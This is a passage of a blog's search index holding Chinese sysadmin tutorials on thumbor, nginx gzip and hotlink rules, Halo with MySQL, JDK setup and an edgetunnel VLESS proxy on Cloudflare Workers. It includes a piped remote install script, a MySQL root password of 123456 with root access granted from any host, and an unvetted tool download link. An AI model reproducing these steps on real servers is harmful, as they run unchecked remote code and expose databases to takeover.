&#x27;/tmp/thumbor/result_storage&#x27;</span><br><span class="line">#开启结果缓存（裁剪图像的缓存）</span><br><span class="line">RESULT_STORAGE_STORES_UNSAFE = True</span><br></pre></td></tr></table></figure>
<p>thumbor还有其它很多配置，有兴趣的朋友可以参考官方文档:<a href="https://thumbor.readthedocs.io/en/latest/configuration.html">https://thumbor.readthedocs.io/en/latest/configuration.html</a></p>
<h2 id="继续在thumbor目录下新建一个docker-compose-yml-内容如下："><a href="#继续在thumbor目录下新建一个docker-compose-yml-内容如下：" class="headerlink" title="继续在thumbor目录下新建一个docker-compose.yml,内容如下："></a>继续在thumbor目录下新建一个docker-compose.yml,内容如下：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">version: &#x27;3.3&#x27;</span><br><span class="line">services:</span><br><span class="line">    thumbor:</span><br><span class="line">        ports:</span><br><span class="line">            - &#x27;8888:80&#x27;</span><br><span class="line">        restart: always</span><br><span class="line">        container_name: thumbor</span><br><span class="line">        volumes:</span><br><span class="line">            - &#x27;./thumbor.conf:/app/thumbor.conf&#x27;</span><br><span class="line">            - &#x27;./result_storage:/tmp/thumbor/result_storage&#x27;</span><br><span class="line">            - &#x27;./storage:/tmp/thumbor/storage&#x27;</span><br><span class="line">        image: minimalcompact/thumbor</span><br></pre></td></tr></table></figure>
<h2 id="输入命令启动容器"><a href="#输入命令启动容器" class="headerlink" title="输入命令启动容器"></a>输入命令启动容器</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
<p>这样我们可以继续使用上面提到的方法裁剪图片了，可访问<a href="http://ip:8888/unsafe/275x0/https://www.baidu.com/img/PCtm_d9c8750bed0b3c7d089fa7d55720d6cf.png">http://IP:8888/unsafe/275x0/https://www.baidu.com/img/PCtm_d9c8750bed0b3c7d089fa7d55720d6cf.png</a></p>
<h1 id="Nginx反向代理"><a href="#Nginx反向代理" class="headerlink" title="Nginx反向代理"></a>Nginx反向代理</h1><p>上述方法部署完毕后，是通过IP + 端口访问的，显然不符合生产要求，我们可以使用nginx反向代理，并通过域名镜像访问，示例配置如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">        listen 80;</span><br><span class="line">        server_name youdomain.com;</span><br><span class="line"></span><br><span class="line">        access_log /data/wwwlogs/youdomain.com_nginx.log combined;</span><br><span class="line"></span><br><span class="line">        location / &#123;</span><br><span class="line">                proxy_http_version 1.1;</span><br><span class="line">                proxy_set_header Connection &quot;&quot;;</span><br><span class="line">                #chunked_transfer_encoding off;</span><br><span class="line">        proxy_pass http://127.0.0.1:8888;</span><br><span class="line">        proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>thumbor提供了多种安装方式，通过Docker部署简单且易于维护<br>正式用途请根据自己的场景自定义thumbor参数<br>可通过nginx反向代理配置域名访问和防盗链限制</p>
]]></content>
      <categories>
        <category>web</category>
        <category>thumbor</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>thumbor</tag>
      </tags>
  </entry>
  <entry>
    <title>halo 博客 nginx 配置 gzip 压缩和 header 缓存配置</title>
    <url>/posts/b287807e/</url>
    <content><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>我们现在搭建网站通常都是使用nginx进行代理转发的，下面就介绍如何在nginx中配置gzip压缩。<br>由博客是使用Halo进行搭建的。代理也是使用的nginx，为了提高网页的响应速度。<br>减少请求资源的带宽，那么就要针对数据进行gzip压缩了。<br>在nginx中配置gzip的压缩很简单。</p>
<h1 id="1-配置方法"><a href="#1-配置方法" class="headerlink" title="1.配置方法"></a>1.配置方法</h1><p>打开服务器上安装的nginx配置文件。<br>下面主要讲解在Halo 搭建的网站中的配置，其他网站配置也是大同小异的。</p>
<h2 id="第一步：进入到nginx："><a href="#第一步：进入到nginx：" class="headerlink" title="第一步：进入到nginx："></a>第一步：进入到nginx：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /etc/nginx/</span><br></pre></td></tr></table></figure>
<p>因为安装nginx 后，默认的所有配置通常都是在etc文件夹下的nginx 文件夹里面。</p>
<h2 id="第二步：编辑conf文件："><a href="#第二步：编辑conf文件：" class="headerlink" title="第二步：编辑conf文件："></a>第二步：编辑conf文件：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim conf.d/halo.conf</span><br></pre></td></tr></table></figure>
<p>因为Halo 配置了一个halo.conf文件。将Halo的nginx代理全部转到了这个文件中。所以我们直接访问这个文件就可以了。<br>在打开的界面中，添加下面的配置：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">  ...</span><br><span class="line">    location / &#123;</span><br><span class="line">        gzip_static on;</span><br><span class="line">        add_header Cache-Control public,max-age=60,s-maxage=60;</span><br><span class="line">        proxy_set_header HOST $host;</span><br><span class="line">        proxy_set_header X-Forwarded-Proto $scheme;</span><br><span class="line">        proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">        proxy_pass http://127.0.0.1:8090/;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">            listen 443;</span><br><span class="line">      ...</span><br><span class="line">            location / &#123;</span><br><span class="line">                    gzip_static on;</span><br><span class="line">                    add_header Cache-Control public,max-age=60,s-maxage=60;</span><br><span class="line">                    proxy_set_header HOST $host;</span><br><span class="line">                    proxy_set_header X-Forwarded-Proto $scheme;</span><br><span class="line">                    proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">                    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">                    proxy_pass http://127.0.0.1:8090/;</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="主要是在location-目录下添加："><a href="#主要是在location-目录下添加：" class="headerlink" title="主要是在location 目录下添加："></a>主要是在location 目录下添加：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gzip_static on;</span><br><span class="line">add_header Cache-Control public,max-age=60,s-maxage=60;</span><br></pre></td></tr></table></figure>
<p>1.是开启gzip压缩的命令。<br>2.是配置Haader的缓存，可以合理利用浏览器的缓存提高加载速度。</p>
<h2 id="第三步：重启nginx。让我们的配置生效："><a href="#第三步：重启nginx。让我们的配置生效：" class="headerlink" title="第三步：重启nginx。让我们的配置生效："></a>第三步：重启nginx。让我们的配置生效：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nginx -s reload</span><br></pre></td></tr></table></figure>
<p>到这里我们的整个缓存加载的手段就配置完毕了。</p>
<h1 id="验证是否开启了Gzip"><a href="#验证是否开启了Gzip" class="headerlink" title="验证是否开启了Gzip"></a>验证是否开启了Gzip</h1><p>配置完毕gzip之后，我们可通过站长工具等进行检测我们的gzip是否开启成功了<br>例如：<a href="http://tool.chinaz.com/Gzips/">网页GZIP压缩检测 - 站长工具 (chinaz.com) </a>在网站上填写你的域名，进行访问就可以了。<br><img src="/img/gzip/1.webp" alt="微信截图_20230713222127"><br>例如我的页面经过压缩后，整个页面文件大小缩短了很多。针对我们服务器宝贵的带宽来说，这个手段可以说是立竿见影的。<br>其他的网站，只要你是使用的nginx 也都是这种开启方式。快试试吧</p>
]]></content>
      <categories>
        <category>web</category>
        <category>halo</category>
        <category>nginx</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>halo</tag>
        <tag>nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>halo 博客连接本地或 docker 安装的 mysql 数据库</title>
    <url>/posts/2f1e42fa/</url>
    <content><![CDATA[<h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><p>切换到root用户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -i</span><br></pre></td></tr></table></figure>
<p>升级packages<br>Debian系统比较干净，安装常用的软件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt update -y  </span><br><span class="line">apt install wget curl sudo vim git  </span><br></pre></td></tr></table></figure>
<blockquote>
<p>halo官方要求mysql数据库需要5.7+，8.0需要6RAM以上，推荐就5.7。php和phpmyadmin选最新,其他随意。<br>默认是使用的H2数据库使用mysql数据库则将H2配置打上注释，将mysql配置注释放开修改username和password为mysql的账号和密码，密码在宝塔数据库界面可查看若在容器中使用数据库，则需要将127.0.0.1换成数据库的容器名，端口为容器内部端口 例：将127.0.0.1:3306换成blog_mysql:3306以下根据个人需求配置： port为halo博客运行的端口</p>
</blockquote>
<h1 id="（centos、ubuntu-debian）安装docker"><a href="#（centos、ubuntu-debian）安装docker" class="headerlink" title="（centos、ubuntu&#x2F;debian）安装docker"></a>（centos、ubuntu&#x2F;debian）安装docker</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#centos 安装 docker</span><br><span class="line">yum -y install docker</span><br><span class="line">#ubuntu/debian 安装 docker</span><br><span class="line">wget -qO- https://get.docker.com/ | sh</span><br><span class="line">#查看 Docker 版本</span><br><span class="line">docker version</span><br></pre></td></tr></table></figure>
<p>安装完成。<br>启动 Docker 后台服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">service docker start</span><br></pre></td></tr></table></figure>
<p>启动 Docker 后台服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">service docker start</span><br></pre></td></tr></table></figure>
<p>开机自动启动</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl enable docker.service</span><br></pre></td></tr></table></figure>
<h1 id="创建halo项目文件夹"><a href="#创建halo项目文件夹" class="headerlink" title="创建halo项目文件夹"></a>创建halo项目文件夹</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir ~/.halo &amp;&amp; cd ~/.halo</span><br></pre></td></tr></table></figure>
<h1 id="下载示例配置文件到-工作目录"><a href="#下载示例配置文件到-工作目录" class="headerlink" title="下载示例配置文件到 工作目录"></a>下载示例配置文件到 工作目录</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget https://dl.halo.run/config/application-template.yaml -O ./application.yaml</span><br></pre></td></tr></table></figure>
<h1 id="使用-Vim-工具修改配置文件application-yaml"><a href="#使用-Vim-工具修改配置文件application-yaml" class="headerlink" title="使用 Vim 工具修改配置文件application.yaml"></a>使用 Vim 工具修改配置文件application.yaml</h1><p>vim ~&#x2F;.halo&#x2F;application.yaml</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server:</span><br><span class="line">  port: 8090</span><br><span class="line"></span><br><span class="line">  # Response data gzip.</span><br><span class="line">  compression:</span><br><span class="line">    enabled: true</span><br><span class="line">spring:</span><br><span class="line">  datasource:</span><br><span class="line"></span><br><span class="line">    # H2 database configuration.</span><br><span class="line">#    driver-class-name: org.h2.Driver</span><br><span class="line">#    url: jdbc:h2:file:~/.halo/db/halo</span><br><span class="line">#    username: admin</span><br><span class="line">#    password: 123456</span><br><span class="line"></span><br><span class="line">    # MySQL database configuration.</span><br><span class="line">    driver-class-name: com.mysql.cj.jdbc.Driver</span><br><span class="line">    url: jdbc:mysql://172.17.0.1:3306/halodb?characterEncoding=utf8&amp;useSSL=false&amp;serverTimezone=Asia/Shanghai&amp;allowPublicKeyRetrieval=true</span><br><span class="line">    username: root</span><br><span class="line">    password: 123456</span><br><span class="line"></span><br><span class="line">  # H2 database console configuration.</span><br><span class="line">#  h2:</span><br><span class="line">#    console:</span><br><span class="line">#      settings:</span><br><span class="line">#        web-allow-others: false</span><br><span class="line">#      path: /h2-console</span><br><span class="line">#      enabled: false</span><br><span class="line"></span><br><span class="line">halo:</span><br><span class="line"></span><br><span class="line">  # Your admin client path is https://your-domain/&#123;admin-path&#125;</span><br><span class="line">  admin-path: admin</span><br><span class="line"></span><br><span class="line">  # memory or level</span><br><span class="line">  cache: memory</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="①直接使用本地数据库"><a href="#①直接使用本地数据库" class="headerlink" title="①直接使用本地数据库"></a>①直接使用本地数据库</h1><h2 id="进入mysql"><a href="#进入mysql" class="headerlink" title="进入mysql"></a>进入mysql</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u root -p</span><br></pre></td></tr></table></figure>
<h2 id="创建halodb数据库"><a href="#创建halodb数据库" class="headerlink" title="创建halodb数据库"></a>创建halodb数据库</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create database halodb character set utf8mb4 collate utf8mb4_bin;</span><br></pre></td></tr></table></figure>
<p>注意这里官方要求字符集为utf8mb4,排序规则为utf8mb4_bin</p>
<h2 id="拉取最新的-Halo-镜像"><a href="#拉取最新的-Halo-镜像" class="headerlink" title="拉取最新的 Halo 镜像"></a>拉取最新的 Halo 镜像</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull halohub/halo:1.6.1</span><br></pre></td></tr></table></figure>
<p>从 1.4.3 开始，Docker 镜像已经转移到 halohub 组织，不再是 ruibaby&#x2F;halo</p>
<h2 id="创建halo容器并使用本地数据库"><a href="#创建halo容器并使用本地数据库" class="headerlink" title="创建halo容器并使用本地数据库"></a>创建halo容器并使用本地数据库</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -itd --net host --name halo -p 8090:8090 -v ~/.halo:/root/.halo --restart=unless-stopped halohub/halo:1.6.1</span><br></pre></td></tr></table></figure>
<p>参数说明：</p>
<p>-i， 即使没有连接，也要保持标准输入保持打开状态，一般与 -t 连用<br>-t， 分配一个伪tty，一般与 -i 连用<br>-d，在后台运行容器，并且打印容器id</p>
<ul>
<li>-name，容器名</li>
<li>-net，指定容器的网络配置</li>
<li>-net&#x3D;bridge 这个是默认值，连接到默认的网桥。</li>
<li>-net&#x3D;host 容器使用本地主机的网络，它拥有完全的本地主机接口访问权限</li>
<li>-net&#x3D;container:NAME_or_ID 让Docker使用其他容器的网路，共享IP和PORT等网络资源，两者进程可以直接通过 lo 环回接口通信</li>
<li>-net&#x3D;none 容器使用自己的网络，但是不进行网络配置，之后用户可以自行配置</li>
</ul>
<p>-p， 容器内部端口绑定到指定的主机端口，主机端口：容器端口<br>-v， 挂载目录，这里是将主机的目录~&#x2F;.halo挂载到容器的目录&#x2F;root&#x2F;.halo上<br>–restart&#x3D;unless-stopped，当docker重启时，容器自动启动<br>docker默认的网络模式是bridge，因此默认容器内无法访问本地127.0.0.1</p>
<h1 id="②利用容器间的关联使用容器中的数据库"><a href="#②利用容器间的关联使用容器中的数据库" class="headerlink" title="②利用容器间的关联使用容器中的数据库"></a>②利用容器间的关联使用容器中的数据库</h1><h2 id="拉取mysql5-7镜像"><a href="#拉取mysql5-7镜像" class="headerlink" title="拉取mysql5.7镜像"></a>拉取mysql5.7镜像</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull mysql:5.7</span><br></pre></td></tr></table></figure>
<h2 id="创建并启动mysql容器"><a href="#创建并启动mysql容器" class="headerlink" title="创建并启动mysql容器"></a>创建并启动mysql容器</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#docker run -p 3306:3306 --name some-mysql -e MYSQL_ROOT_PASSWORD=my-secret-pw -d mysql:tag</span><br><span class="line">-p : 端口映射，使得外部可以通过虚拟机的3306端口访问容器的3306端口</span><br><span class="line">--name :the name of the container</span><br><span class="line">-e :the password of the root user</span><br><span class="line">-d :后台运行</span><br><span class="line"></span><br><span class="line">docker run -p 3306:3306 --name halo_mysql -e MYSQL_ROOT_PASSWORD=123456 -d mysql:5.7</span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li>-name，容器名-e 设置环境变量，MYSQL_ROOT_PASSWORD为数据库密码，自行修改，用户名默认root</li>
</ul>
</blockquote>
<h2 id="进入容器"><a href="#进入容器" class="headerlink" title="进入容器"></a>进入容器</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker exec -it halo_mysql /bin/bash</span><br></pre></td></tr></table></figure>
<h2 id="进入mysql并创建halo必要数据库halodb，注意字符集和排序规则"><a href="#进入mysql并创建halo必要数据库halodb，注意字符集和排序规则" class="headerlink" title="进入mysql并创建halo必要数据库halodb，注意字符集和排序规则"></a>进入mysql并创建halo必要数据库halodb，注意字符集和排序规则</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u root -p</span><br><span class="line">create database halodb character set utf8mb4 collate utf8mb4_bin;</span><br></pre></td></tr></table></figure>
<h2 id="拉取最新的-Halo-镜像-1"><a href="#拉取最新的-Halo-镜像-1" class="headerlink" title="拉取最新的 Halo 镜像"></a>拉取最新的 Halo 镜像</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull halohub/halo:1.6.1</span><br></pre></td></tr></table></figure>
<h2 id="创建halo容器并使其关联数据库容器"><a href="#创建halo容器并使其关联数据库容器" class="headerlink" title="创建halo容器并使其关联数据库容器"></a>创建halo容器并使其关联数据库容器</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -itd --name halo --link halo_mysql -p 8090:8090 -v ~/.halo:/root/.halo --restart=unless-stopped halohub/halo:1.6.1</span><br></pre></td></tr></table></figure>
<h2 id="参数说明："><a href="#参数说明：" class="headerlink" title="参数说明："></a>参数说明：</h2><p>-i， 即使没有连接，也要保持标准输入保持打开状态，一般与 -t 连用<br>-t， 分配一个伪tty，一般与 -i 连用<br>-d，在后台运行容器，并且打印容器id</p>
<ul>
<li>-name，容器名</li>
<li>-link，指定容器间的关联<br>-p， 容器内部端口绑定到指定的主机端口，主机端口：容器端口<br>-v， 挂载目录，这里是将主机的目录~&#x2F;.halo挂载到容器的目录&#x2F;root&#x2F;.halo上</li>
<li>-restart&#x3D;always，当docker重启时，容器自动启动<br>PS:如果要使用外部数据库管理工具远程管理mysql，则需要用户开启远程登录功能<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Grant all privileges on *.* to &#x27;root&#x27;@&#x27;%&#x27; identified by ‘password’with grant option;</span><br><span class="line">flush privileges;      刷新权限</span><br></pre></td></tr></table></figure>
<blockquote>
<p>. 为 数据库.表 ，root为用户，%代表所有主机 ，password处填写用户密码</p>
</blockquote>
</li>
</ul>
<h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><p>创建并启动halo容器后，会有20s左右的初始化建表时间，初始化后在数据库halodb当中能看见自动创建的表，若没有表，请检查问题<br>Halo工作目录的绝对路径为 ~&#x2F;.halo，这个工作目录是固定的，Halo容器运行后里面通常包含下列目录或文件：<br>db：存放 H2 Database 的物理文件，如果您使用 MySQL 数据库，那么不会存在这个目录<br>templates&#x2F;themes：里面包含用户所下载的主题<br>static：相当于网站的根目录<br>logs：运行日志目录<br>application.yaml：配置文件</p>
<p>放行端口80 443 8090！！！<br>云服务器防火墙和宝塔的防火墙两边都要放行！！！</p>
<p>到这里我们就可以以<a href="http://ip:8090的方式访问halo安装程序了">http://ip:8090的方式访问halo安装程序了</a><br>可以先配置好域名访问和SSL再进行安装</p>
]]></content>
      <categories>
        <category>tools</category>
        <category>web</category>
        <category>database</category>
        <category>halo</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>web</tag>
        <tag>database</tag>
        <tag>halo</tag>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>java development kit (jdk) 环境，在 linux 搭建</title>
    <url>/posts/8fdd786f/</url>
    <content><![CDATA[<p>下载JDK，通过华为云的镜像加速下载，这里以JDK1.8为例子，其他版本类似，可以到<a href="https://repo.huaweicloud.com/java/jdk/%E6%9F%A5%E7%9C%8B%E6%9B%B4%E5%A4%9A%E7%89%88%E6%9C%AC">https://repo.huaweicloud.com/java/jdk/查看更多版本</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir /usr/lib/java</span><br><span class="line">cd /usr/lib/java</span><br><span class="line">wget https://repo.huaweicloud.com/java/jdk/8u202-b08/jdk-8u202-linux-x64.tar.gz</span><br></pre></td></tr></table></figure>
<p>解压JDK压缩包文件<br><img src="/img/jdk/1.webp" alt="20200623123710838"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar -zxvf jdk-8u202-linux-x64.tar.gz</span><br></pre></td></tr></table></figure>
<p>解压后会得到如图的jdk1.8.0_202文件<br><img src="/img/jdk/2.webp" alt="20200623123741511"><br>配置java的环境变量，编辑 &#x2F;etc&#x2F;profile，在文件尾部加如下 JDK 环境配置即可<br><img src="/img/jdk/3.webp" alt="20200623123802673"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/profile     #编辑文件信息</span><br><span class="line">--------------------------------------</span><br><span class="line">JAVA_HOME=/usr/lib/java/jdk1.8.0_202</span><br><span class="line">CLASSPATH=$JAVA_HOME/lib/</span><br><span class="line">PATH=$PATH:$JAVA_HOME/bin</span><br><span class="line">export PATH JAVA_HOME CLASSPATH</span><br><span class="line">#编辑完成后esc :wq退出</span><br><span class="line">--------------------------------------</span><br><span class="line">source /etc/profile  #使得文件生效</span><br><span class="line">java -version        #查看Java版本</span><br><span class="line">--------------------------------------</span><br><span class="line">java version &quot;1.8.0_202&quot;</span><br><span class="line">Java(TM) SE Runtime Environment (build 1.8.0_202-b08)</span><br><span class="line">Java HotSpot(TM) 64-Bit Server VM (build 25.202-b08, mixed mode)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>os</category>
        <category>ubuntu</category>
        <category>centos</category>
        <category>debian</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>ubuntu</tag>
        <tag>debian</tag>
        <tag>centos</tag>
      </tags>
  </entry>
  <entry>
    <title>edgetunnel 用 worker 脚本将 vless 协议节点部署在 cloudflare cdn 服务器搭配优选ip（优选ip地址会在固定地区变换）</title>
    <url>/posts/76d86625/</url>
    <content><![CDATA[<h1 id="项目地址：https-github-com-zizifn-edgetunnel"><a href="#项目地址：https-github-com-zizifn-edgetunnel" class="headerlink" title="项目地址：https://github.com/zizifn/edgetunnel"></a>项目地址：<a href="https://github.com/zizifn/edgetunnel">https://github.com/zizifn/edgetunnel</a></h1><p>worker-vless.js代码地址：<a href="https://github.com/zizifn/edgetunnel/blob/main/src/worker-vless.js">https://github.com/zizifn/edgetunnel/blob/main/src/worker-vless.js</a></p>
<h1 id="部署方法："><a href="#部署方法：" class="headerlink" title="部署方法："></a>部署方法：</h1><p>Workers 和 Pages——创建应用程序——创建Worker——起名部署——快速编辑——清空原有代码，复制粘贴worker-vless.js代码——用v2rayN添加VLESS服务器生成UUID复制粘贴覆盖第7行原有的UUID——第9行添加下面提供的（5选1）CDN加速地址，保存并部署</p>
<h2 id="UUID生成网站：https-1024tools-com-uuid"><a href="#UUID生成网站：https-1024tools-com-uuid" class="headerlink" title="UUID生成网站：https://1024tools.com/uuid"></a>UUID生成网站：<a href="https://1024tools.com/uuid">https://1024tools.com/uuid</a></h2><h2 id="3Kmfi6HP大佬代码中的5个CDN加速地址"><a href="#3Kmfi6HP大佬代码中的5个CDN加速地址" class="headerlink" title="3Kmfi6HP大佬代码中的5个CDN加速地址"></a>3Kmfi6HP大佬代码中的5个CDN加速地址</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cdn-all.xn--b6gac.eu.org</span><br><span class="line">cdn.xn--b6gac.eu.org</span><br><span class="line">cdn-b100.xn--b6gac.eu.org</span><br><span class="line">edgetunnel.anycast.eu.org</span><br><span class="line">cdn.anycast.eu.org</span><br></pre></td></tr></table></figure>
<h1 id="两种配置"><a href="#两种配置" class="headerlink" title="两种配置"></a>两种配置</h1><h2 id="1-有域名（有tls加密，443端口-，推荐！"><a href="#1-有域名（有tls加密，443端口-，推荐！" class="headerlink" title="1.有域名（有tls加密，443端口)，推荐！"></a>1.有域名（有tls加密，443端口)，推荐！</h2><p>Custom Domains查看——添加自定义域——填1个二级域名<br>点击自定义域，在二级域名后加&#x2F;UUID，就能看到VLESS节点URL和Clash-meta配置<br>在v2rayN导入URL，地址栏改为优选ip</p>
<h2 id="2-无域名（没tls加密，80或者2052端口）"><a href="#2-无域名（没tls加密，80或者2052端口）" class="headerlink" title="2.无域名（没tls加密，80或者2052端口）"></a>2.无域名（没tls加密，80或者2052端口）</h2><p>进去worker.dev，加上&#x2F;uuid就能看到VLESS节点URL和Clash-meta配置。shadowrocket等客户端要去掉tls加密，端口改为80或者2052，地址修为优选 ip</p>
<h1 id="优选ip获取方法："><a href="#优选ip获取方法：" class="headerlink" title="优选ip获取方法："></a>优选ip获取方法：</h1><h2 id="workers专用0717优选IP工具下载：https-wwsf-lanzouw-com-i7Pwq12tr6qh-密码-hcbp"><a href="#workers专用0717优选IP工具下载：https-wwsf-lanzouw-com-i7Pwq12tr6qh-密码-hcbp" class="headerlink" title="workers专用0717优选IP工具下载：https://wwsf.lanzouw.com/i7Pwq12tr6qh 密码:hcbp"></a>workers专用0717优选IP工具下载：<a href="https://wwsf.lanzouw.com/i7Pwq12tr6qh">https://wwsf.lanzouw.com/i7Pwq12tr6qh</a> 密码:hcbp</h2><h2 id="CF优选ip网站：https-stock-hostmonit-com-CloudFlareYes"><a href="#CF优选ip网站：https-stock-hostmonit-com-CloudFlareYes" class="headerlink" title="CF优选ip网站：https://stock.hostmonit.com/CloudFlareYes"></a>CF优选ip网站：<a href="https://stock.hostmonit.com/CloudFlareYes">https://stock.hostmonit.com/CloudFlareYes</a></h2><h2 id="TG-群-https-t-me-CF-NAT"><a href="#TG-群-https-t-me-CF-NAT" class="headerlink" title="TG 群 https://t.me/CF_NAT"></a>TG 群 <a href="https://t.me/CF_NAT">https://t.me/CF_NAT</a></h2>]]></content>
      <categories>
        <category>proxy</category>
        <category>edtunnel</category>
      </categories>
      <tags>
        <tag>proxy</tag>
        <tag>edtunnel</tag>
      </tags>
  </entry>
  <entry>
    <title>halo博客在nginx proxy manager配置检测referer实现防盗图片链接</title>
    <url>/posts/9075db7b/</url>
    <content><![CDATA[<p>joe2.0主题地址：<a href="https://bbchin.com/archives/halo-theme-joe20">https://bbchin.com/archives/halo-theme-joe20</a></p>
<h1 id="原版nginx代码"><a href="#原版nginx代码" class="headerlink" title="原版nginx代码"></a>原版nginx代码</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 资源防盗链（指定目录or指定文件类型）</span><br><span class="line"># location ~ .*\.(gif|jpg|jpeg|png|bmp|swf)$ &#123;</span><br><span class="line">location /upload/ &#123;</span><br><span class="line">  access_log off;</span><br><span class="line">  # 域名白名单，去掉则阻止所有非本站请求</span><br><span class="line">  valid_referers none blocked server_names *.bbchin.com 127.0.0.1 localhost ~\.google\. ~\.baidu\. ~\.qq\.;</span><br><span class="line">  if ($invalid_referer) &#123;</span><br><span class="line">    rewrite ^/ https://cdn.jsdelivr.net/gh/qinhua/cdn_assets/img/robber.jpg;</span><br><span class="line">  &#125;</span><br><span class="line">  proxy_pass http://127.0.0.1:8090;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="修改后的代码填入-Advanced"><a href="#修改后的代码填入-Advanced" class="headerlink" title="修改后的代码填入 Advanced"></a>修改后的代码填入 Advanced</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">location ~ .*\.(webp|gif)$ &#123;</span><br><span class="line">  access_log off;</span><br><span class="line">  valid_referers none blocked server_names *.macin.top ip地址 ~\.google\. ~\.baidu\. ~\.qq\.;</span><br><span class="line">  if ($invalid_referer) &#123;</span><br><span class="line">    rewrite ^/ https://cdn.jsdelivr.net/gh/qinhua/cdn_assets/img/robber.jpg; </span><br><span class="line">    &#125;</span><br><span class="line">  proxy_pass http://172.17.0.1:8090;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="检验防盗链是否成功"><a href="#检验防盗链是否成功" class="headerlink" title="检验防盗链是否成功"></a>检验防盗链是否成功</h1><p><a href="https://www.bt.cn/bbs/forum.php?mod=post&action=reply&fid=36&tid=8827&cedit=yes">https://www.bt.cn/bbs/forum.php?mod=post&amp;action=reply&amp;fid=36&amp;tid=8827&amp;cedit=yes</a></p>
<h1 id="如果是用-Cloudflare-的-CDN-服务，那就无需设置-nginx-防盗链了，因为设置了也不会生效。在-Cloudflare-的-Scrape-Shield-拉到最下面-Hotlink-保护打开即可防止站外链接指向您网站的图像"><a href="#如果是用-Cloudflare-的-CDN-服务，那就无需设置-nginx-防盗链了，因为设置了也不会生效。在-Cloudflare-的-Scrape-Shield-拉到最下面-Hotlink-保护打开即可防止站外链接指向您网站的图像" class="headerlink" title="如果是用 Cloudflare 的 CDN 服务，那就无需设置 nginx 防盗链了，因为设置了也不会生效。在 Cloudflare 的 Scrape Shield 拉到最下面 Hotlink 保护打开即可防止站外链接指向您网站的图像"></a>如果是用 Cloudflare 的 CDN 服务，那就无需设置 nginx 防盗链了，因为设置了也不会生效。在 Cloudflare 的 Scrape Shield 拉到最下面 Hotlink 保护打开即可防止站外链接指向您网站的图像</h1>]]></content>
      <categories>
        <category>web</category>
        <category>halo</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>halo</tag>
      </tags>
  </entry>
  <entry>
    <title>HEXO 本地安装部署教程和常见问题解决方法</title>
    <url>/posts/df30a776/</url>
